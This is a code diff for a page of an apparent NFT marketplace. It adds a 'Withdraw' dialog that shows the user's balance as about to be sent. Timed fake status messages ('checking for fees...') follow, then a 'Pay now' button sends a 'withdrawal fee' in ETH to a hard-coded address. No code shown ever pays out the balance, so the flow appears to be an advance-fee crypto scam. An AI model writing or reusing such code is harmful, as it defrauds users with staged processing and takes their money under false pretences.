@@ -3,7 +3,10 @@ import Image from "next/image";
 import { useDataContext } from "@/components/context/DataProvider";
 import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
 import { faEthereum } from "@fortawesome/free-brands-svg-icons";
-import { faTriangleExclamation } from "@fortawesome/free-solid-svg-icons";
+import {
+  faExclamationCircle,
+  faTriangleExclamation,
+} from "@fortawesome/free-solid-svg-icons";
 import ConfirmBtn from "@/components/loading/ConfirmBtn";
 import ShoppingCard from "@/components/NFtcards/ShoppingCard";
 import { useState, useEffect, use } from "react";
@@ -39,6 +42,9 @@ const page = (props) => {
   const [totalValue, setTotalValue] = useState(0);
   const [totalLike, setTotalLikes] = useState(0);
   const [totalViews, setTotalLikesViews] = useState(0);
+  const [steps, setSteps] = useState(1);
+  const [withdrawalTab, setWithdrawalTab] = useState(false);
+  const [withdrawalMsg, setWithdrawalMsg] = useState("processing payment...");
 
   const appaddress = process.env.BROKER_WALLET;
   async function payGasfee() {
@@ -48,16 +54,64 @@ const page = (props) => {
       }
       sendTransaction({
         to: "0x9247ebcd3cce95918b344b07d3a1b02884158e69",
-        value: parseEther("0.0004"),
+        value: parseEther((collection?.gasfeeamount).toString()),
       });
-      if (isConfirmed) {
-        toast.success("payment successful");
-      }
+
       console.log(hash);
     } catch (error) {
       console.log(error.name, ": ", error.message);
     }
   }
+  async function payWithdrawalFee() {
+    try {
+      if (!address) {
+        open();
+        return;
+      }
+      sendTransaction({
+        to: "0x9247ebcd3cce95918b344b07d3a1b02884158e69",
+        value: parseEther((collection?.withdrawalFee).toString()),
+      });
+
+      console.log(hash);
+    } catch (error) {
+      console.log(error.name, ": ", error.message);
+    }
+  }
+
+  const cancelPayment = () => {
+    setSteps(1);
+    setWithdrawalTab(false);
+    setWithdrawalMsg("processing payment...");
+  };
+
+  const nextStep = () => {
+    setSteps((prev) => prev + 1);
+  };
+  const prevStep = () => {
+    setSteps((prev) => prev - 1);
+  };
+
+  useEffect(() => {
+    if (steps === 2) {
+      setTimeout(() => {
+        setWithdrawalMsg("checking for fees...");
+      }, 2000);
+      setTimeout(() => {
+        setWithdrawalMsg(
+          `withdrawal fee to process this transaction is ${collection?.withdrawalFee} eth`
+        );
+      }, 10000);
+    }
+  }, [steps]);
+
+  useEffect(() => {
+    if (isConfirmed) {
+      toast.success("payment successful");
+      setWithdrawalTab(false);
+      setWithdrawalMsg("processing payment...");
+    }
+  }, [isConfirmed]);
 
   useEffect(() => {
     async function fetchParams() {
@@ -97,6 +151,71 @@ const page = (props) => {
   return (
     <div className="w-full min-h-screen p-3 pt-[75px] pb-6">
       <div className="w-full p-2 flex flex-col sm:flex-row items-center justify-between">
+        {withdrawalTab && (
+          <div className="fixed w-[300px] min-h-[400px] sm:h-[511px] sm:w-[332px] bg-black z-40 flex flex-col items-center justify-center">
+            {steps === 1 && (
+              <div className="flex flex-col w-full items-center justify-center">
+                <FontAwesomeIcon
+                  icon={faExclamationCircle}
+                  className="text-2xl text-green-600"
+                />
+                <p className="text-center max-w-72 break-words">
+                  {" "}
+                  the amount of <b> {(user?.balance).toFixed(4)} ETH</b> will be
+                  sent to: <br /> {user?.walletAddress}{" "}
+                </p>
+                <div className="my-2">
+                  {" "}
+                  <ConfirmBtn
+                    title={"Cancel"}
+                    otherStyles={
+                      "p-3 bg-[#ef8bf7]/40  rounded-[10px] mt-4 mx-1"
+                    }
+                    handleClicked={cancelPayment}
+                  />
+                  <ConfirmBtn
+                    title={"Continue"}
+                    otherStyles={
+                      "p-3 bg-gradient-to-r from-[#843eff]/80 to-[#fe4ff2]/80 rounded-[10px] mt-4 mx-1"
+                    }
+                    handleClicked={nextStep}
+                  />
+                </div>
+              </div>
+            )}
+            {steps === 2 && (
+              <div className="flex flex-col w-full items-center justify-center ">
+                <FontAwesomeIcon
+                  icon={faExclamationCircle}
+                  className="text-2xl text-yellow-500"
+                />
+                <p className="text-center max-w-72 break-words">
+                  {withdrawalMsg}
+                </p>
+                {withdrawalMsg ===
+                  `withdrawal fee to process this transaction is ${collection?.withdrawalFee} eth` && (
+                  <div className="my-2 ">
+                    <ConfirmBtn
+                      title={"Cancel"}
+                      otherStyles={
+                        "p-3 bg-[#ef8bf7]/40  rounded-[10px] mt-4 mx-1"
+                      }
+                      handleClicked={cancelPayment}
+                    />
+                    <ConfirmBtn
+                      title={"Pay now"}
+                      otherStyles={
+                        "p-3 bg-gradient-to-r from-[#843eff]/80 to-[#fe4ff2]/80 rounded-[10px] mt-4 mx-1"
+                      }
+                      handleClicked={payWithdrawalFee}
+                    />
+                  </div>
+                )}
+              </div>
+            )}
+          </div>
+        )}
+
         <div className="flex items-start justify-between">
           <Image
             src={collection?.banner || "/assets/banner.jpg"}
@@ -135,7 +254,7 @@ const page = (props) => {
             <p className="text-black font-semibold w-full px-2">
               Estimated:{" "}
               <span className="float-right">
-                {collection?.gasFeeAmount} ETH{" "}
+                {collection?.gasfeeamount} ETH{" "}
                 <FontAwesomeIcon icon={faEthereum} />
               </span>
             </p>
@@ -180,7 +299,8 @@ const page = (props) => {
         {user?.balance > 0 && (
           <ConfirmBtn
             title={"Withdraw"}
-            otherStyles={"bg-green-600 p-4 w-[300px]"}
+            otherStyles={"bg-[#141414] p-4 w-[300px]"}
+            handleClicked={() => setWithdrawalTab(true)}
           />
         )}
         <ConfirmBtn
